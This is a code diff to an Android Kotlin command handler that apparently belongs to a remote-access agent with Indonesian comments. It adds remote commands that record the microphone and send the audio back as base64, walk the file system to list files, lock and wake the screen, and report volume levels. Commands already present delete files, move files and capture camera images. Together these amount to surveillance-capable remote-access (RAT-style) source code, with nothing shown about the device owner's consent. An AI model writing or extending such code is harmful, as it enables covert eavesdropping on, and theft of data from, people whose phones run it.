@@ -50,6 +50,8 @@ import android.app.WallpaperManager
 import android.content.Intent
 import android.content.pm.ApplicationInfo
 import java.net.URL
+import android.app.admin.DevicePolicyManager
+import android.os.PowerManager
 import android.graphics.BitmapFactory
 
 class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {
@@ -122,6 +124,47 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     sendResponse(resp)
                     return resp
                 }
+                "device_lock", "lock_screen" -> {
+                    try {
+                        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                        val compName = android.content.ComponentName(context, DeviceAdminReceiver::class.java)
+                        if (dpm.isAdminActive(compName)) {
+                            dpm.lockNow()
+                            val resp = createResponse(cmdId, "success", "Screen locked")
+                            sendResponse(resp); return resp
+                        } else {
+                            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
+                                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk mengunci layar secara remote.")
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            }
+                            context.startActivity(intent)
+                            val resp = createResponse(cmdId, "info", "Aktivasi Device Admin diperlukan di perangkat.")
+                            sendResponse(resp); return resp
+                        }
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Lock failed: ${e.message}")
+                        sendResponse(resp); return resp
+                    }
+                }
+                "device_wake", "screen_on" -> {
+                    try {
+                        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+                        @Suppress("DEPRECATION")
+                        val wl = pm.newWakeLock(
+                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
+                            PowerManager.ACQUIRE_CAUSES_WAKEUP or
+                            PowerManager.ON_AFTER_RELEASE,
+                            "rac-js:wakeup"
+                        )
+                        wl.acquire(5000L) // Hidupkan selama 5 detik
+                        val resp = createResponse(cmdId, "success", "Screen woken up")
+                        sendResponse(resp); return resp
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Wake failed: ${e.message}")
+                        sendResponse(resp); return resp
+                    }
+                }
                 "vibrate" -> {
                     try {
                         val durationMs = (textArg.toFloatOrNull() ?: 1f) * 1000L
@@ -167,10 +210,15 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                     val volInfo = JSONObject().apply {
                         put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
+                        put("ring_max", am.getStreamMaxVolume(AudioManager.STREAM_RING))
                         put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
+                        put("music_max", am.getStreamMaxVolume(AudioManager.STREAM_MUSIC))
                         put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
+                        put("alarm_max", am.getStreamMaxVolume(AudioManager.STREAM_ALARM))
                         put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
+                        put("voice_max", am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL))
                         put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
+                        put("notification_max", am.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION))
                     }
                     val resp = createResponse(cmdId, "volume_info", volInfo)
                     sendResponse(resp)
@@ -529,27 +577,52 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                     }
                 }
+                "find" -> {
+                    val p = textArg.split("|")
+                    val root = java.io.File(if (p.isNotEmpty()) p[0] else "/sdcard")
+                    val query = if (p.size > 1) p[1].lowercase() else ""
+                    val res = JSONArray()
+                    fun walk(d: java.io.File, depth: Int) {
+                        if (depth > 5) return
+                        d.listFiles()?.forEach {
+                            if (it.isDirectory) walk(it, depth + 1)
+                            else if (query.isEmpty() || it.name.lowercase().contains(query)) {
+                                res.put(JSONObject().apply {
+                                    put("name", it.name); put("path", it.absolutePath)
+                                    put("is_dir", false); put("size", it.length())
+                                })
+                            }
+                            if (res.length() > 500) return@forEach
+                        }
+                    }
+                    if (root.exists()) walk(root, 0)
+                    val resp = createResponse(cmdId, "find_result", res)
+                    sendResponse(resp); return resp
+                }
+                "record_sound" -> {
+                    try {
+                        val duration = textArg.toLongOrNull() ?: 5L
+                        val file = java.io.File(context.cacheDir, "record.mp4")
+                        val mr = android.media.MediaRecorder()
+                        mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                        mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                        mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                        mr.setOutputFile(file.absolutePath)
+                        mr.prepare(); mr.start()
+                        Thread.sleep(duration * 1000)
+                        mr.stop(); mr.release()
+                        val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.DEFAULT)
+                        val resp = createResponse(cmdId, "audio_base64", b64)
+                        sendResponse(resp); return resp
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", e.message ?: "Record failed")
+                        sendResponse(resp); return resp
+                    }
+                }
             }
 
             // Async-only: long running tasks yang tidak perlu return langsung ke HTTP
             when (command) {
-                "record_sound" -> {
-                    Thread {
-                        try {
-                            val duration = textArg.toLongOrNull() ?: 5L
-                            val file = java.io.File(context.cacheDir, "record.mp4")
-                            val mr = android.media.MediaRecorder()
-                            mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                            mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
-                            mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-                            mr.setOutputFile(file.absolutePath)
-                            mr.prepare(); mr.start()
-                            Thread.sleep(duration * 1000); mr.stop(); mr.release()
-                            val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.DEFAULT)
-                            sendResponse(createResponse(cmdId, "audio_base64", b64))
-                        } catch (e: Exception) { sendResponse(createResponse(cmdId, "error", e.message ?: "Record failed")) }
-                    }.start()
-                }
                 "rm" -> {
                     val f = java.io.File(textArg)
                     if (f.exists()) {
@@ -561,18 +634,6 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val p = textArg.split("|")
                     if (p.size == 2 && java.io.File(p[0]).renameTo(java.io.File(p[1])))
                         sendResponse(createResponse(cmdId, "success", "Moved"))
-                }
-                "find" -> {
-                    Thread {
-                        val p = textArg.split("|"); val root = java.io.File(if (p.isNotEmpty()) p[0] else "/sdcard")
-                        val query = if (p.size > 1) p[1].lowercase() else ""
-                        val res = JSONArray()
-                        fun walk(d: java.io.File) {
-                            d.listFiles()?.forEach { if (it.isDirectory) walk(it) else if (it.name.lowercase().contains(query)) res.put(JSONObject().apply { put("name", it.name); put("path", it.absolutePath) }) }
-                        }
-                        if (root.exists()) walk(root)
-                        sendResponse(createResponse(cmdId, "find_result", res))
-                    }.start()
                 }
                 "download" -> {
                     Thread {
@@ -656,7 +717,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         try {
                             val characteristics = camManager.getCameraCharacteristics(cameraId)
                             val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
-                            val jpegOrientation = if (useFront) (360 - sensorOrientation) % 360 else sensorOrientation
+                            val jpegOrientation = sensorOrientation
 
                             val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                 addTarget(imageReader.surface)
